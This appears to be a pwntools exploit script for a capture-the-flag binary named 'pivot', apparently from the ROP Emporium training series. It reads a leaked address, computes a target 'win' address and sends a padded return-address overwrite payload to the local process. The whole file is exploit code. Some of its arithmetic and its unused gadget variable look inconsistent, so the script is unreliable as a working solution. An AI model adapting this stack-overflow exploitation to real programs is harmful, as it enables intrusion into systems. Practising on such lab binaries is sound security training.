from pwn import*


elf = context.binary = ELF('./pivot', checksec=False)

p = process("./pivot")

#gdb.attach(p, gdbscript='''
#b*pwnme+113
#c
#''')
adget = elf.sym['usefulGadgets']

p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")

libc_base = int(p.recv(12),16) + 0x10f0
win = libc_base + 0x1e1a81
print("[+]LIBC_BASE:", hex(libc_base))
print("[+]WIN:      ", hex(win))
payload = flat(
    cyclic(0x28),
    win
      )
p.sendlineafter(b"> ",payload)
p.sendlineafter(b"> ",payload)
p.interactive()
